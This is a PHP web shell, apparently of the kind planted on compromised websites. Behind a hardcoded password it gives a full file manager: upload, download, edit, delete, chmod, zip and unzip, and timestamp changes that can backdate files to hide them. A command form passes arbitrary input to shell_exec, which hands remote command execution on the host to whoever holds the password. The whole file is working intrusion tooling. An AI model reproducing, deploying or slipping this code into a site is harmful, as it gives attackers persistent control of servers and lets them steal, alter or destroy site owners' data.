<?php
session_start();

// Password protection
$password = 'merdeka123'; // Ganti dengan password yang Anda inginkan
if (!isset($_SESSION['loggedin']) || $_SESSION['loggedin'] !== true) {
    if (isset($_POST['password']) && $_POST['password'] === $password) {
        $_SESSION['loggedin'] = true;
    } else {
        echo '
        <form method="post" style="text-align: center; margin-top: 20%;">
            <input type="password" name="password" placeholder="Enter Password" required>
            <button type="submit">Login</button>
        </form>';
        exit;
    }
}

// Fungsi untuk menghindari path traversal
function sanitize_path($path) {
    return str_replace(['../', './'], '', $path);
}

// Fungsi untuk menghapus folder rekursif
function delete_folder($path) {
    if (is_dir($path)) {
        $files = array_diff(scandir($path), ['.', '..']);
        foreach ($files as $file) {
            delete_folder("$path/$file");
        }
        rmdir($path);
    } else {
        unlink($path);
    }
}

// Mendapatkan path saat ini
$current_path = isset($_GET['path']) ? sanitize_path($_GET['path']) : '.';
$current_path = realpath($current_path);

// Breadcrumb
$breadcrumbs = explode('/', trim($current_path, '/'));
$breadcrumb_path = '';

// Handle actions
if (isset($_POST['action'])) {
    $target = isset($_POST['target']) ? sanitize_path($_POST['target']) : '';
    $target_path = realpath($current_path . '/' . $target);

    switch ($_POST['action']) {
        case 'rename':
            $new_name = isset($_POST['new_name']) ? sanitize_path($_POST['new_name']) : '';
            if ($new_name && $target_path) {
                rename($target_path, dirname($target_path) . '/' . $new_name);
            }
            break;
        case 'delete':
            if ($target_path) {
                delete_folder($target_path);
            }
            break;
        case 'chmod':
            $mode = isset($_POST['mode']) ? $_POST['mode'] : '';
            if ($target_path && $mode) {
                chmod($target_path, octdec($mode));
            }
            break;
        case 'touch':
            $timestamp = isset($_POST['timestamp']) ? strtotime($_POST['timestamp']) : time();
            if ($target_path) {
                touch($target_path, $timestamp);
            }
            break;
        case 'mkdir':
            $dir_name = isset($_POST['dir_name']) ? sanitize_path($_POST['dir_name']) : '';
            if ($dir_name) {
                mkdir($current_path . '/' . $dir_name);
            }
            break;
        case 'create_file':
            $file_name = isset($_POST['file_name']) ? sanitize_path($_POST['file_name']) : '';
            if ($file_name) {
                file_put_contents($current_path . '/' . $file_name, '');
            }
            break;
        case 'edit_file':
            $file_content = isset($_POST['file_content']) ? $_POST['file_content'] : '';
            if ($target_path && is_file($target_path)) {
                file_put_contents($target_path, $file_content);
            }
            break;
        case 'compress':
            if ($target_path) {
                $zip = new ZipArchive();
                $zip_name = $target_path . '.zip';
                if ($zip->open($zip_name, ZipArchive::CREATE) === TRUE) {
                    if (is_dir($target_path)) {
                        $files = new RecursiveIteratorIterator(
                            new RecursiveDirectoryIterator($target_path),
                            RecursiveIteratorIterator::LEAVES_ONLY
                        );
                        foreach ($files as $file) {
                            if (!$file->isDir()) {
                                $file_path = $file->getRealPath();
                                $relative_path = substr($file_path, strlen($target_path) + 1);
                                $zip->addFile($file_path, $relative_path);
                            }
                        }
                    } else {
                        $zip->addFile($target_path, basename($target_path));
                    }
                    $zip->close();
                }
            }
            break;
        case 'uncompress':
            if ($target_path && is_file($target_path) && pathinfo($target_path, PATHINFO_EXTENSION) === 'zip') {
                $zip = new ZipArchive();
                if ($zip->open($target_path) === TRUE) {
                    $zip->extractTo($current_path);
                    $zip->close();
                }
            }
            break;
        case 'command':
            $command = isset($_POST['command']) ? $_POST['command'] : '';
            if ($command) {
                $output = shell_exec("cd $current_path && $command 2>&1");
            }
            break;
    }
    header("Location: ?path=" . urlencode($current_path));
    exit;
}

// Handle file upload
if (isset($_FILES['file'])) {
    $upload_path = $current_path . '/' . basename($_FILES['file']['name']);
    move_uploaded_file($_FILES['file']['tmp_name'], $upload_path);
    header("Location: ?path=" . urlencode($current_path));
    exit;
}

// Handle file download
if (isset($_GET['download'])) {
    $target = sanitize_path($_GET['download']);
    $target_path = realpath($current_path . '/' . $target);
    if ($target_path && file_exists($target_path)) {
        if (is_dir($target_path)) {
            $zip = new ZipArchive();
            $zip_name = $target_path . '.zip';
            if ($zip->open($zip_name, ZipArchive::CREATE) === TRUE) {
                $files = new RecursiveIteratorIterator(
                    new RecursiveDirectoryIterator($target_path),
                    RecursiveIteratorIterator::LEAVES_ONLY
                );
                foreach ($files as $file) {
                    if (!$file->isDir()) {
                        $file_path = $file->getRealPath();
                        $relative_path = substr($file_path, strlen($target_path) + 1);
                        $zip->addFile($file_path, $relative_path);
                    }
                }
                $zip->close();
                header('Content-Type: application/zip');
                header('Content-Disposition: attachment; filename="' . basename($zip_name) . '"');
                header('Content-Length: ' . filesize($zip_name));
                readfile($zip_name);
                unlink($zip_name);
                exit;
            }
        } else {
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename="' . basename($target_path) . '"');
            header('Content-Length: ' . filesize($target_path));
            readfile($target_path);
            exit;
        }
    }
}

// Handle file editing
if (isset($_GET['file'])) {
    $file_to_edit = sanitize_path($_GET['file']);
    $file_path = realpath($current_path . '/' . $file_to_edit);

    if ($file_path && is_file($file_path) && strpos($file_path, realpath($current_path)) === 0) {
        $file_content = file_get_contents($file_path);
    } else {
        $file_content = "Cannot edit this file.";
    }
}

if (isset($_GET['file']) && isset($_GET['raw'])) {
    $file_to_edit = sanitize_path($_GET['file']);
    $file_path = realpath($current_path . '/' . $file_to_edit);

    if ($file_path && is_file($file_path) && strpos($file_path, realpath($current_path)) === 0) {
        header("Content-Type: text/plain");
        echo file_get_contents($file_path);
        exit;
    } else {
        http_response_code(403);
        echo "Cannot edit this file.";
        exit;
    }
}

?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SEO FERDI INI BOS !!</title>
    <style>body{font-family:Arial,sans-serif;margin:20px;background-color:#1f1f2e;color:#f1f1f1}table{width:100%;border-collapse:collapse;margin-top:20px;background-color:#2b2b3d;border-radius:6px;overflow:hidden}td,th{padding:10px 14px;text-align:left}th{background-color:#383852;color:#00f6ff;font-weight:700;border-bottom:2px solid #444}tr:nth-child(even){background-color:#242436}tr:hover{background-color:#3a3a50}.breadcrumb{margin-bottom:20px;font-size:14px}.breadcrumb a{text-decoration:none;color:#00f6ff}.breadcrumb a:hover{text-decoration:underline}.actions{margin-bottom:20px}button{background:linear-gradient(135deg,#00f6ff,#00b7ff);color:#1e1e2f;border:none;padding:10px 18px;margin:6px 8px 6px 0;border-radius:999px;cursor:pointer;font-weight:700;font-size:14px;transition:all .25s ease;box-shadow:0 2px 6px rgba(0,246,255,.3)}button:hover{background:linear-gradient(135deg,#00e5ff,#0af);transform:translateY(-2px);box-shadow:0 4px 10px rgba(0,246,255,.5)}.modal{display:none;position:fixed;top:12%;left:50%;transform:translateX(-50%);background:#2c2c3e;padding:20px;border:1px solid #444;box-shadow:0 0 10px rgba(0,0,0,.4);border-radius:8px;z-index:999;width:420px;color:#fff}.modal input[type=datetime-local],.modal input[type=text],.modal textarea{width:100%;padding:10px;margin-top:10px;background:#1c1c2a;border:1px solid #555;color:#f1f1f1;border-radius:5px}.modal button{margin-top:10px}input[type=file]{background:#1c1c2a;color:#f1f1f1;padding:6px;border:1px solid #444;border-radius:5px;margin-bottom:10px}pre{background-color:#111;color:#0f8;padding:12px;border-radius:8px;overflow-x:auto;margin-top:10px}a{color:#f1f1f1;text-decoration:none}a:hover{color:#00f6ff;text-decoration:underline}</style>
    <script async custom-element="amp-form" src="https://cdn.ampproject.org/v0/amp-form-0.1.js"></script>
</head>
<body>
    <h1>SEO FERDI INI BOS !!</h1>

    <!-- Breadcrumb -->
    <div class="breadcrumb">
        <a href="?path=.">Root</a>
        <?php foreach ($breadcrumbs as $crumb): ?>
            / <a href="?path=<?= urlencode($breadcrumb_path . '/' . $crumb) ?>"><?= $crumb ?></a>
            <?php $breadcrumb_path .= '/' . $crumb; ?>
        <?php endforeach; ?>
    </div>

    <!-- Actions -->
    <div class="actions">
        <button onclick="window.location.href='?path=.'">Home</button>
        <button onclick="window.location.href='?path=<?= urlencode(dirname($current_path)) ?>'">Back</button>
        <button onclick="document.getElementById('uploadForm').style.display='block'">Upload</button>
        <button onclick="document.getElementById('createFolderForm').style.display='block'">Create Folder</button>
        <button onclick="document.getElementById('createFileForm').style.display='block'">Create File</button>
        <button onclick="document.getElementById('commandForm').style.display='block'">Run Command</button>
    </div>

    <!-- Upload Form -->
    <form id="uploadForm" action="" method="post" enctype="multipart/form-data" style="display:none; margin-bottom: 20px;">
        <input type="file" name="file">
        <button type="submit">Upload</button>
        <button type="button" onclick="document.getElementById('uploadForm').style.display='none'">Cancel</button>
    </form>

    <!-- Create Folder Form -->
    <form id="createFolderForm" action="" method="post" style="display:none; margin-bottom: 20px;">
        <input type="text" name="dir_name" placeholder="New Folder Name" required>
        <button type="submit" name="action" value="mkdir">Create Folder</button>
        <button type="button" onclick="document.getElementById('createFolderForm').style.display='none'">Cancel</button>
    </form>

    <!-- Create File Form -->
    <form id="createFileForm" action="" method="post" style="display:none; margin-bottom: 20px;">
        <input type="text" name="file_name" placeholder="New File Name" required>
        <button type="submit" name="action" value="create_file">Create File</button>
        <button type="button" onclick="document.getElementById('createFileForm').style.display='none'">Cancel</button>
    </form>

    <!-- Command Form -->
    <form id="commandForm" action="" method="post" style="display:none; margin-bottom: 20px;">
        <input type="text" name="command" placeholder="Enter Linux Command" required>
        <button type="submit" name="action" value="command">Run Command</button>
        <button type="button" onclick="document.getElementById('commandForm').style.display='none'">Cancel</button>
    </form>
    <?php if (isset($output)): ?>
        <pre><?= htmlspecialchars($output) ?></pre>
    <?php endif; ?>

    <!-- File List -->
    <table>
        <thead>
            <tr>
                <th>Name</th>
                <th>Type</th>
                <th>Size</th>
                <th>Permissions</th>
                <th>Owner/Group</th>
                <th>Last Modified</th>
                <th>Actions</th>
            </tr>
        </thead>
        <tbody>
            <?php if ($current_path !== realpath('.')): ?>
                <tr>
                    <td><a href="?path=<?= urlencode(dirname($current_path)) ?>">..</a></td>
                    <td>Parent Directory</td>
                    <td></td>
                    <td></td>
                    <td></td>
                    <td></td>
                    <td></td>
                </tr>
            <?php endif; ?>
            <?php
            $items = scandir($current_path);
            $folders = array_filter($items, function($item) use ($current_path) {
                return is_dir($current_path . '/' . $item) && $item !== '.' && $item !== '..';
            });
            $files = array_filter($items, function($item) use ($current_path) {
                return is_file($current_path . '/' . $item);
            });
            ?>
            <?php foreach ($folders as $item): ?>
                <?php $item_path = $current_path . '/' . $item; ?>
                <tr>
                    <td>
                        <a href="?path=<?= urlencode($item_path) ?>"><?= $item ?></a>
                    </td>
                    <td>Directory</td>
                    <td></td>
                    <td><?= substr(sprintf('%o', fileperms($item_path)), -4) ?></td>
                    <td><?= posix_getpwuid(fileowner($item_path))['name'] . '/' . posix_getgrgid(filegroup($item_path))['name'] ?></td>
                    <td><?= date("Y-m-d H:i:s", filemtime($item_path)) ?></td>
                    <td>
                        <button onclick="openRenameModal('<?= $item ?>')">Rename</button>
                        <button onclick="openChmodModal('<?= $item ?>')">Chmod</button>
                        <button onclick="openTimestampModal('<?= $item ?>')">Timestamp</button>
                        <button onclick="if(confirm('Are you sure?')) { document.getElementById('deleteForm<?= $item ?>').submit(); }">Delete</button>
                        <button onclick="window.location.href='?path=<?= urlencode($current_path) ?>&download=<?= urlencode($item) ?>'">Download</button>
                        <button onclick="if(confirm('Compress this folder?')) { document.getElementById('compressForm<?= $item ?>').submit(); }">Compress</button>
                        <form id="deleteForm<?= $item ?>" action="" method="post" style="display:none;">
                            <input type="hidden" name="target" value="<?= $item ?>">
                            <input type="hidden" name="action" value="delete">
                        </form>
                        <form id="compressForm<?= $item ?>" action="" method="post" style="display:none;">
                            <input type="hidden" name="target" value="<?= $item ?>">
                            <input type="hidden" name="action" value="compress">
                        </form>
                    </td>
                </tr>
            <?php endforeach; ?>
            <?php foreach ($files as $item): ?>
                <?php $item_path = $current_path . '/' . $item; ?>
                <tr>
                    <td><?= $item ?></td>
                    <td>File</td>
                    <td><?= filesize($item_path) . ' bytes' ?></td>
                    <td><?= substr(sprintf('%o', fileperms($item_path)), -4) ?></td>
                    <td><?= posix_getpwuid(fileowner($item_path))['name'] . '/' . posix_getgrgid(filegroup($item_path))['name'] ?></td>
                    <td><?= date("Y-m-d H:i:s", filemtime($item_path)) ?></td>
                    <td>
                        <button onclick="openRenameModal('<?= $item ?>')">Rename</button>
                        <button onclick="openChmodModal('<?= $item ?>')">Chmod</button>
                        <button onclick="openTimestampModal('<?= $item ?>')">Timestamp</button>
                        <button onclick="openEditor('<?= $item ?>')">Edit</button>
                        <button onclick="if(confirm('Are you sure?')) { document.getElementById('deleteForm<?= $item ?>').submit(); }">Delete</button>
                        <button onclick="window.location.href='?path=<?= urlencode($current_path) ?>&download=<?= urlencode($item) ?>'">Download</button>
                        <?php if (pathinfo($item_path, PATHINFO_EXTENSION) === 'zip'): ?>
                            <button onclick="if(confirm('Uncompress this file?')) { document.getElementById('uncompressForm<?= $item ?>').submit(); }">Uncompress</button>
                        <?php else: ?>
                            <button onclick="if(confirm('Compress this file?')) { document.getElementById('compressForm<?= $item ?>').submit(); }">Compress</button>
                        <?php endif; ?>
                        <form id="deleteForm<?= $item ?>" action="" method="post" style="display:none;">
                            <input type="hidden" name="target" value="<?= $item ?>">
                            <input type="hidden" name="action" value="delete">
                        </form>
                        <form id="compressForm<?= $item ?>" action="" method="post" style="display:none;">
                            <input type="hidden" name="target" value="<?= $item ?>">
                            <input type="hidden" name="action" value="compress">
                        </form>
                        <form id="uncompressForm<?= $item ?>" action="" method="post" style="display:none;">
                            <input type="hidden" name="target" value="<?= $item ?>">
                            <input type="hidden" name="action" value="uncompress">
                        </form>
                    </td>
                </tr>
            <?php endforeach; ?>
        </tbody>
    </table>

    <!-- Modals -->
    <div id="renameModal" class="modal">
        <h2>Rename</h2>
        <form action="" method="post">
            <input type="hidden" name="target" id="renameTarget">
            <input type="text" name="new_name" placeholder="New Name" required>
            <button type="submit" name="action" value="rename">Rename</button>
            <button type="button" onclick="closeModal('renameModal')">Cancel</button>
        </form>
    </div>

    <div id="chmodModal" class="modal">
        <h2>Change Permissions</h2>
        <form action="" method="post">
            <input type="hidden" name="target" id="chmodTarget">
            <input type="text" name="mode" placeholder="e.g., 755" required>
            <button type="submit" name="action" value="chmod">Change</button>
            <button type="button" onclick="closeModal('chmodModal')">Cancel</button>
        </form>
    </div>

    <div id="timestampModal" class="modal">
        <h2>Change Timestamp</h2>
        <form action="" method="post">
            <input type="hidden" name="target" id="timestampTarget">
            <input type="datetime-local" name="timestamp" step="1" required>
            <button type="submit" name="action" value="touch">Change</button>
            <button type="button" onclick="closeModal('timestampModal')">Cancel</button>
        </form>
    </div>

    <div id="editorModal" class="modal">
        <h2>Edit File</h2>
        <form action="" method="post">
    <input type="hidden" name="target" id="editTarget">
    <textarea name="file_content" id="fileContent"></textarea><br>
    <button type="submit" name="action" value="edit_file">Save</button>
    <button type="button" onclick="closeModal('editorModal')">Cancel</button>
</form>
    </div>

    <script>
        function openRenameModal(target) {
            document.getElementById('renameTarget').value = target;
            document.getElementById('renameModal').style.display = 'block';
        }

        function openChmodModal(target) {
            document.getElementById('chmodTarget').value = target;
            document.getElementById('chmodModal').style.display = 'block';
        }

        function openTimestampModal(target) {
            document.getElementById('timestampTarget').value = target;
            document.getElementById('timestampModal').style.display = 'block';
        }

        function openEditor(file) {
            document.getElementById('editTarget').value = file;
            fetch('?path=<?= urlencode($current_path) ?>&file=' + file + '&raw=true')
            .then(response => response.text())
            .then(data => {
            document.getElementById('fileContent').value = data;
            document.getElementById('editorModal').style.display = 'block';
        });
}

        function closeModal(modalId) {
            document.getElementById(modalId).style.display = 'none';
        }
    </script>
</body>
</html>